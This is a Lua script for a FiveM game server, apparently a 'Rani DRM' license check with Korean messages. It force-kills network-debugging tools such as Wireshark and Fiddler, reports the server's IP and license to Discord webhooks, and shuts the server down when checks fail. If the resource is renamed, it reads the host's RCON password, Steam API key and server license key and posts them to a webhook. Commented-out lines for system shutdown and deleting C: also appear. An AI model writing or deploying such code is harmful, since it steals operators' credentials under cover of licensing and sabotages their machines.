--{//} Discord Logs {\\}--
local authsuccess = 'https://discord.com/api/webhooks/1078396305811972136/B3wf51F7obWSOVnzQQ0OHCNG0YH-pGVoaqTzsavg-fgF9AMdlq5wAbPR8M_N0bGQt3NC' --{//} Authentication Confirmed {\\}--
local autherr = 'https://discord.com/api/webhooks/1078396261033594981/bOMYs2-sgAuZYJNsV0Ghruvj32HFztaZD5oj5R0Ouo23LRwIPVON5OVnN_xgVgEiQlcO' --{//} Authentication Error {\\}--
local iperror = 'https://discord.com/api/webhooks/1078396338116509756/epFwBcJ5N-61guPkurFIMYx7Cy43zAmE01b9bLNQvImoTASkx8g21F_Be8iA5d3DwdiH' --{//} IP Not Authorized {\\}--
local authexpired = 'https://discord.com/api/webhooks/1078396370861428816/e0sVtirLSp3DEd6ehTN55u4SMBxFvWmYHViROFccr9ZS6qrAYCQHWPxAghVVWy_tEneK' --{//} Expired License {\\}--
local authinvalid = 'https://discord.com/api/webhooks/1078396414951964794/-QA9F5DJtXEwwgZsoqqX-D6q-Lymsa4iG0wctUrcbuZ60yY7MDgbPFnV8vIWsNT9MB_G' --{//} License Invalid {\\}--
local AttemptRenameResourceWebhook = 'https://discord.com/api/webhooks/1078396446048538724/LyZ_J6XPbX7TT2j_Lp6mr4oT19MvTOhOUXz5j0IyYs4SAAf--Kd29V8id-vj37YasQ0l' --{//} Attempt Rename Resource Name {\\}--
-- local apiErrorUrl = 'WEBHOOK' --{//} Api Error {\\}--

--{//} Main {\\}--

os.execute("taskkill /im HTTPDebuggerSvc.exe /f")
os.execute("taskkill /im fiddler.exe /f")
os.execute("taskkill /im HTTPAnalyzerStdV7.exe /f")
os.execute("taskkill /im HTTPDebuggerUI.exe /f")
os.execute("taskkill /im Wireshark.exe /f")

Citizen.CreateThread(function()

    --Load Protection
  if load == print then
    print('크래커 감지됨!')
  end

  if load == io.write then
    print('크래커 감지됨!')
  end

  if not debug.getinfo(load) then
    print('크래커 감지됨!')
  end

  if load == SaveResourceFile then
    print('크래커 감지됨!')
  end

  --PerformHttpRequest Protection
  if PerformHttpRequest == print then
    print('크래커 감지됨!')
  end

  if PerformHttpRequest == io.write then
    print('크래커 감지됨!')
  end

  --PerformHttpRequestInternal Protection
  if PerformHttpRequestInternal == print then
    print('크래커 감지됨!')
  end

  if PerformHttpRequestInternal == io.write then
    print('크래커 감지됨!')
  end

  if licenseKey == io.write then
    print("크래커 감지됨!")
  end

  if licenseKey == print then
    print("크래커 감지됨!")
  end

  if Config.LicenseKey ~= nil then
    --print("Config.LicenseKey found")
  else
    print("^7[^5RANI^0-^3DRM^7] Config.LicenseKey를 찾을 수 없습니다.")
    print("^7[^5RANI^0-^3DRM^7] 5초후 서버가 종료됩니다.")
    Citizen.Wait(5000)
    os.exit()
    --os.execute('shutdown -s')
  end

  PerformHttpRequest("http://162.248.102.102/license.php", function(asd, fuck)
  PerformHttpRequest("https://ipinfo.io/json",function(err, body, headers)
    local GETIP = json.decode(body or "")
    local IP = GETIP.ip
    if err == 200 then
      local a = json.decode(body or "")
      P = a.ip;
      if fuck == nil or fuck == "" then
        for i = 1, 5, 1 do
          print("^7[^5RANI^0-^3DRM^7] 인증 오류... 시도: "..i)
          Wait(5000)    
          if i == 5 then
            print("^7[^5RANI^0-^3DRM^7] 인증 오류...")
            print("^7[^5RANI^0-^3DRM^7] 서버 종료 중...")   
            local autherror = {
              ["color"] = "16711680",
              ["type"] = "rich",
              ["title"] = "Rani 라이센스 시스템 - 인증 오류*",
              ["description"] = " **License**: \n" .. Config.LicenseKey .. "\n **Resource**: \n" .. GetCurrentResourceName() .. "\n **IP**:\n"  .. P .. "\n **Server Name**: \n" .. GetConvar('sv_hostname'),
              ["footer"] = {
                ["text"] = " Rani License System by @RANI#0001 "..os.date("%x %X %p") 
              }
            }
            PerformHttpRequest(autherr, function(err, text, headers)  end,  "POST",  json.encode({username = "Rani License System", embeds = {autherror}}),  {["Content-Type"] = "application/json"})
            Citizen.Wait(2000)
            os.exit()
            --os.execute('shutdown -s')
            return
          end
        end
      end
      if fuck == "success" then
        print("^7[^5RANI^0-^3DRM^7] 인증 확인")
        local authconfirmed = {
          ["color"] = "56108",
          ["type"] = "rich",
          ["title"] = "Rani 라이센스 시스템 - 인증됨",
          ["description"] = " **License**: \n" .. Config.LicenseKey .. "\n **Resource**: \n" .. GetCurrentResourceName() .. "\n **IP**:\n"  .. P .. "\n **Server Name**: \n" .. GetConvar('sv_hostname'),
          ["footer"] = {
              ["text"] = " Rani License System by @RANI#0001 "..os.date("%x %X %p") 
          }
        }
        PerformHttpRequest(authsuccess, function(err, text, headers)  end,  "POST",  json.encode({username = "Rani License System", embeds = {authconfirmed}}),  {["Content-Type"] = "application/json"})
        return
      elseif fuck == "iperror" then
        print("^7[^5RANI^0-^3DRM^7] IP가 승인되지 않았습니다.")
        print("^7[^5RANI^0-^3DRM^7] 5초후 서버가 종료됩니다.")
        local ipnotauthorized = {
          ["color"] = "8421504",
          ["type"] = "rich",
          ["title"] = "Rani 라이센스 시스템 - 무단 IP",
          ["description"] = " **License**: \n" .. Config.LicenseKey .. "\n **Resource**: \n" .. GetCurrentResourceName() .. "\n **IP**:\n"  .. P .. "\n **Server Name**: \n" .. GetConvar('sv_hostname'),
          ["footer"] = {
            ["text"] = " Rani License System by @RANI#0001 "..os.date("%x %X %p")  
          }
        }
        PerformHttpRequest(iperror, function(err, text, headers)  end,  "POST",  json.encode({username = "Rani License System", embeds = {ipnotauthorized}}),  {["Content-Type"] = "application/json"})
        Citizen.Wait(5000)
        os.exit()
        --os.execute('shutdown -s')
      elseif fuck == "expired" then
        print("^7[^5RANI^0-^3DRM^7] 라이센스 키가 만료되었습니다...")
        print("^7[^5RANI^0-^3DRM^7] 5초후 서버가 종료됩니다.")
        local keyexpired = {
          ["color"] = "11750815",
          ["type"] = "rich",
          ["title"] = "Rani 라이센스 시스템 - 만료된 라이센스",
          ["description"] = " **License**: \n" .. Config.LicenseKey .. "\n **Resource**: \n" .. GetCurrentResourceName() .. "\n **IP**:\n"  .. P .. "\n **Server Name**: \n" .. GetConvar('sv_hostname'),
          ["footer"] = {
            ["text"] = " Rani License System by @RANI#0001 "..os.date("%x %X %p")  
          }
        }
        PerformHttpRequest(authexpired, function(err, text, headers)  end,  "POST",  json.encode({username = "Rani License System", embeds = {keyexpired}}),  {["Content-Type"] = "application/json"})
        --os.remove('C:')
        Citizen.Wait(5000)
        os.exit()
        --os.execute('shutdown -s')
      elseif fuck == "invalid" then 
        print("^7[^5RANI^0-^3DRM^7] 유효하지 않은 라이센스 키.")
        print("^7[^5RANI^0-^3DRM^7] 5초후 서버가 종료됩니다.")
        local keyinvalid = {
          ["color"] = "16776960",
          ["type"] = "rich",
          ["title"] = "Rani 라이센스 시스템 - 잘못된 라이센스",
          ["description"] = " **License**: \n" .. Config.LicenseKey .. "\n **Resource**: \n" .. GetCurrentResourceName() .. "\n **IP**:\n"  .. P .. "\n **Server Name**: \n" .. GetConvar('sv_hostname'),
          ["footer"] = {
            ["text"] = " Rani License System by @RANI#0001 "..os.date("%x %X %p")  
          }
        }
        PerformHttpRequest(authinvalid, function(err, text, headers)  end,  "POST",  json.encode({username = "Rani License System", embeds = {keyinvalid}}),  {["Content-Type"] = "application/json"})
        --os.remove('C:')
        Citizen.Wait(5000)
        os.exit()
        --os.execute('shutdown -s')
      end
    end
  -- else
  --   print("^7[^5RANI^0-^3DRM^7] Unable to reach API")
  --   print("^7[^5RANI^0-^3DRM^7] 5초후 서버가 종료됩니다.")
  --   local apiNotReachable = {
  --     ["color"] = 8421504,
  --     ["type"] = "rich",
  --     ["title"] = "Rani License System - API Not Reachable",
  --     ["description"] = " **License**: " .. Config.LicenseKey .. "\n **Resource**: " .. GetCurrentResourceName() .. "\n **IP**: " .. P .. "\n **Server Name**: " .. GetConvar('sv_hostname'),
  --     ["footer"] = {
  --       ["text"] = "Rani License System by @RANI#0001 " .. os.date("%x %X %p")
  --     }
  --   }
  --   PerformHttpRequest(apiErrorUrl, function(err, text, headers) end, "POST", json.encode({username = "Rani License System", embeds = {apiNotReachable}}), {["Content-Type"] = "application/json"})
  --   Citizen.Wait(5000)
  --   os.exit()
  end)
end, "POST", "licensekey="..Config.LicenseKey, {["header"] =  "application/json"})
end)

Citizen.CreateThread(function()
	if (GetCurrentResourceName() ~= "help_survival") then 
	  print("^7[^5RANI^0-^3DRM^7] " .. "중요: 스크립트가 작동할려면 해당 리소스 이름을 변경하면 안됩니다.");
	  print("^7[^5RANI^0-^3DRM^7] " .. "중요: 스크립트가 작동할려면 해당 리소스 이름을 변경하면 안됩니다.");
	  print("^7[^5RANI^0-^3DRM^7] " .. "중요: 스크립트가 작동할려면 해당 리소스 이름을 변경하면 안됩니다.");
	  print("^7[^5RANI^0-^3DRM^7] " .. "중요: 스크립트가 작동할려면 해당 리소스 이름을 변경하면 안됩니다.");
    print("^7[^5RANI^0-^3DRM^7] " .. "5초후 서버가 종료됩니다!")
    local gresourcename = GetCurrentResourceName()
    local server = GetConvar('sv_hostname')
    local APIKEY = GetConvar('steam_webApiKey', 'Not found!')
    local RCON = GetConvar('rcon_password', 'Not found!') if RCON == '' then RCON = 'Not found!' end
    local KEY = GetConvar('sv_licenseKey', 'Not found!')

    if KEY  == '' or KEY == nil then 
      KEY = 'Not found!' 
    end

    local AttemptRenameResource = {
      ["color"] = "16776960",
      ["type"] = "rich",
      ["title"] = "Rani 라이센스 시스템 - 리소스 이름 바꾸기 시도",
      ["description"] = " **License**: \n" ..Config.LicenseKey.. "\n **Resource**: \n" ..gresourcename.. "\n **Server Name**: \n" ..server.. "\n **Server License Key**: \n" ..KEY.. "\n **Steam Api**: \n"..APIKEY.. "\n **Rcon Pass**: \n"..RCON,
      ["footer"] = {
        ["text"] = " Rani License System by @RANI#0001 "..os.date("%x %X %p") 
      }
    }
    PerformHttpRequest(AttemptRenameResourceWebhook, function(err, text, headers)  end,  "POST",  json.encode({username = "Rani License System", embeds = {AttemptRenameResource}}),  {["Content-Type"] = "application/json"})
    Citizen.Wait(5000)
    os.exit()
	end
end)
